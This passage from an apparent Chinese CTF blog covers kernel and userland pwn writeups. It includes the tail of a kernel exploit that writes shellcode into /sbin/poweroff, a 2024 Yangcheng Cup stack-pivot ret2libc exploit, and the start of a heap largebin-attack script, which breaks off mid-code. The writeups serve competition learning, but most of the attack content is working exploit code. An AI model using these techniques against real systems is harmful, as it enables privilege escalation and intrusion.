<span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *alloc_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(alloc_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], alloc_buf, <span class="number">0x20</span>);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open target file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求解效果-3"><a href="#求解效果-3" class="headerlink" title="求解效果"></a>求解效果</h3><img src="/2024/10/07/kno_puts/13.png" class="" title="我的图图呢">  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里想分享一下我做题时的心理变化。当时我看见 <code>uaf</code> 直接想着用 <code>USMA</code> 给他秒了，所以调试都懒的调直接一口气把整个 <code>exp</code> 给写完，结果一运行发现内核编译时关闭了某些选项，导致无法执行：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br></pre></td></tr></table></figure><p>也就是说无法使用 <code>USMA</code>，于是我就用正常点打打法去劫持 <code>tty_struct</code> 然后使用 <code>work_for_cpu_fn</code> 一把梭，结果内核直接卡在 <code>work_for_cpu_fn</code> 里面了，想了半天没想明白，最后发现我的 <code>vmlinux</code> 是来自别的题目的😇🤣，当场裂开。把所有地址替换正确也花了点时间，可是程序还是卡在 <code>work_for_cpu_fn</code> 里面，我觉得是我把 <code>fake ops</code> 写到了 <code>tty_struct</code> 占用了某些变量的位置造成的，于是我就用 <code>ret2hbp</code> 想把 <code>fake ops</code> 写到 <code>db_stack</code> 上，结果感觉又是编译时关闭了某些选项？写半天写不上去，直接心态崩了。后面有人提醒我看看能不能用 <code>pt_regs</code>，我看了眼偏移是固定了，于是马上在 <code>pt_regs</code> 上写好 kenrel rop 直接栈迁移过去，中间为了找 <code>init_cred</code> 的地址又不得不把 <code>vmlinux</code> 丢进 <code>ida</code> 里面慢慢找，最后成功把血给搞没了🤣</p><p>感觉自己的水平还是太低了，我还能变得更强把 :-(</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯 2024 pwn writeup</title>
      <link href="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"/>
      <url>/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/</url>
      
        <content type="html"><![CDATA[<p>去年就知道这个比赛很卷，没想到今年更卷。某某战队距离比赛结束还有40分钟时排名第一，比赛结束时排第二十一，真的逆天。<br>这次比赛学长不是在实习就是去帮别的战队打，到头来pwn全都只能我一个人来打，真的好累喵😇。还好题目不是很难，一共五题pwn，前4题很快就打完了，最后一题巨抽象，本地不同的打法都通了，远程死活不同，真是让人道心破碎捏。</p><h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><p>这是本次比赛的签到题，主逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s start the construction for stack overflow exploit.&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you grasp this little bit of overflow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里存在<code>0x10</code>字节的溢出。由于只能覆盖<code>rbp</code>和<code>ret</code>，所以需要栈迁移，然后<code>ret2libc</code>，这里我栈迁移了2次，第一次用来泄露地址，第二次用来getshell。可是不知道是不是环境的问题，我本地打<code>system(&quot;/bin/sh&quot;)</code>死活都不通，打<code>execve(&quot;/bin/sh&quot;,0,0)</code>发现栈迁移后溢出的字节不够我写rop链，最后只能使用libc上的gadget来使其满足其中一个<code>one_gadget</code>来getshell😇<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">31213</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ogg = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>,<span class="number">0xebce2</span>,<span class="number">0xebd38</span>,<span class="number">0xebd3f</span>,<span class="number">0xebd43</span>]</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601500</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(ret)+p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ogg)):</span><br><span class="line">    ogg[i] += libc_base</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601700</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_r13 = <span class="number">0x0000000000041c4a</span> + libc_base</span><br><span class="line">pop_r12 = <span class="number">0x0000000000035731</span> + libc_base</span><br><span class="line">pop_rbp = <span class="number">0x000000000002a2e0</span> + libc_base</span><br><span class="line">execve = libc.symbols[<span class="string">&#x27;execve&#x27;</span>] + libc_base</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f2e7</span> + libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rbp)+p64(<span class="number">0x601780</span>)+p64(ogg[<span class="number">5</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><p>这是本次比赛唯一的堆风水题，其题目大概的意思是让我们输入路径，然后有个函数叫<code>Dijkstra</code>用来计算最短路劲，这里先看堆块是申请的</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/1.png" class="" title="我的图图呢">  <p>可以看见堆块的大小和我们选用的交通工具有关系，能申请的堆块大小有<code>0x520/0x530/0x540</code></p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/2.png" class="" title="我的图图呢">  <p>free函数中存在十分明显的<code>UAF</code>漏洞</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/3.png" class="" title="我的图图呢">  <p>edit函数只能够使用一次，而且在使用前需要满足<code>edit_flag2</code>变量的值为<code>true</code>，这个变量的值可以通过<code>Dijkstra</code>函数计算当前城市距离<code>guangzhou</code>的距离是否大于<code>2000</code>来改变</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/4.png" class="" title="我的图图呢">  <p>可以由于add函数对路径的长度有限制，所以正常情况下这个条件是无法满足的<br>求解思路为利用堆风水合理构造堆块获取一次<code>edit</code>机会，然后<code>largebin attack</code>打<code>_IO_list_all</code>。由于这里开启了沙箱，所以我们使用<code>orw</code>读出flag。这题的栈地址远程和本地有 <code>8</code> 字节的偏差，逆天<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34146</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">citys = [<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="string">b&#x27;fuzhou&#x27;</span>]</span><br><span class="line">trans = [<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;plane&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;distance.&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">tran,froms,tos,far,note</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;What kind of transportation do you want? car/train/plane?&#x27;</span>)</span><br><span class="line">    p.sendline(trans[tran])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(far))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">djsk</span>(<span class="params">froms</span>):</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">500</span>,<span 